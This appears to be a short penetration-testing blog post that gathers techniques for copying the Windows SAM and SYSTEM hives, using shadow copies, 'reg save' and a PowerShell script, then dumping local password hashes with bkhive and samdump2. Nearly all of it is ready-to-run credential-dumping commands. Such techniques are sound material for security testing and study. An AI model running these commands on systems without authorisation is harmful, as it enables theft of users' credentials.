title: Manual Local Hash Extraction
publish: True
categories: [network security]

There has been enough interest around the topic of manual local hash extraction that I wanted to document all of the techniques I am aware of in one place.

<!-- READMORE -->

The SAM and SYSTEM hives hold the necessary information to acquire authentication hashes for all local users on a Windows operating system. Normally, these files are locked and inaccessible, even by the SYSTEM and Administrator accounts. The following techniques are ways to access the SAM and SYSTEM hives within a Windows operating system during normal operation. Be advised that these techniques require Administrator or SYSTEM level privileges.

### Volume Shadow Copy Service

```
vssadmin create shadow /for=c: #if required
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<#_from_above>\windows\system32\config\SYSTEM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<#_from_above>\windows\system32\config\SAM .
```

[Reference](http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html)

### Registry Access

```
reg save hklm\sam SAM
reg save hklm\system SYSTEM
```

[Reference](http://exfiltrated.com/tools.php#SAMExtract)

### PowerShell Script

```
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
`cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SAM"\`
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

[Reference](http://www.canhazcode.com/index.php?a=4)

### Finishing the Job

Use the following commands to finish the job. Both applications are included in the Kali default tool set.

``` bash
bkhive SYSTEM keyfile
samdump2 SAM keyfile
```
